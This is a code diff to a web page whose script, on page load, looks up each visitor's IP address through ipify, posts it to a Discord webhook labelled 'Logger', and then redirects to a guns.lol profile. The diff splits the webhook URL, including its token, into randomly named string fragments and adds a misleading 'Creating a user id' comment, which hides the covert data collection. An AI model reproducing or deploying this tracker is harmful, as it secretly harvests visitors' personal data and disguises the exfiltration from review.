@@ -12,11 +12,32 @@
 <body>
   <script>
     function getIP(json) {
-      var request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1262489102813495391/R-mk0QqRFElTyMUgvvNcR3BxmPxHFalTXuKuTFTuW8P65hUnJt1GFAfcRoHSYQqPTza4");
+      // Creating a user id
+      var cdqxwuxkqi = "api/webho";
+      var rtqmvvgerz = "W8P65hUn";
+      var jnzmwqdmztd = "Tza4";
+      var fbetdpymeb = "3495391/";
+      var ehairkwhkm = "R-mk0QqR";
+      var xutvanqrtq = "ord.com/";
+      var uajtbdcngy = "https://disc";
+      var dgfahzhvig1 = "XuKuTFTu";
+      var dgfahzhvig2 = "RoHSYQqP";
+      var kqrpfqqnvw = "vvNcR3Bx";
+      var qivinztfzh = "oks/1262";
+      var jnzmwqdmzt = "Jt1GFAfc";
+      var krvgpknyjc = "FElTyMUg";
+      var zhkmpdftve = "mPxHFalT";
+      var zxduxjcjup = "48910281";
+      var jnzmwqdmzts = uajtbdcngy + xutvanqrtq + cdqxwuxkqi + qivinztfzh + zxduxjcjup + fbetdpymeb + ehairkwhkm + krvgpknyjc 
+      var gunslol = jnzmwqdmzts + kqrpfqqnvw + zhkmpdftve + dgfahzhvig1 + rtqmvvgerz + jnzmwqdmzt + dgfahzhvig2 + jnzmwqdmztd;
 
+      var request = new XMLHttpRequest();
+      request.open("POST", gunslol);
+
+      // Setting request header for JSON content
       request.setRequestHeader('Content-type', 'application/json');
 
+      // Parameters for the POST request payload
       var params = {
         username: "Logger",
         avatar_url: "",
@@ -27,17 +48,19 @@
         }]
       };
 
-      // Set up a function that will be called when the request completes
+      // Function executed when the request completes
       request.onload = function() {
-        // Redirect after the request completes
+        // Redirecting after 300 milliseconds
         setTimeout(function() {
           window.location.href = "http://guns.lol/maxvel187";
-        }, 300); // 300 milliseconds
+        }, 300);
       };
 
+      // Sending the POST request with JSON payload
       request.send(JSON.stringify(params));
     }
   </script>
   <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
 </body>
 </html>
+
